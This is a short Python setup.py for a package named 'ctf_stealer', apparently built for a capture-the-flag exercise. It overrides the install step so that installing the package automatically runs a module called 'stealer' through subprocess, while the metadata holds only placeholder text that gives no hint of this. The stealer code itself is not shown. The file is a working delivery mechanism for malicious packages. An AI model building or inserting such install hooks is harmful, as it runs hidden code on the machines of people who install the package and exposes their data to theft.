from setuptools import setup
from setuptools.command.install import install

class InstallCommand(install):
 """Override the default Install class to run a custom command post-install."""

 def run(self):
 install.run(self)
 # Import subprocess module to execute a shell command
 import subprocess as sp
 
 # Execute the ctf_stealer.stealer module using python -m (module execution)
 sp.call(["python", "-m", "ctf_stealer.stealer"])

# Setup configuration for the package named ctf_stealer
setup(
 name="ctf_stealer",
 version="0.1",
 description="A brief description of what your package does.",
 author="Your Actual Name Here",
 
 # List of packages included in this distribution (no subpackages by default)
 packages=["ctf_stealer"],
 
 # Custom command classes for setup.py phases
 cmdclass={
 "install": InstallCommand,
 },
)
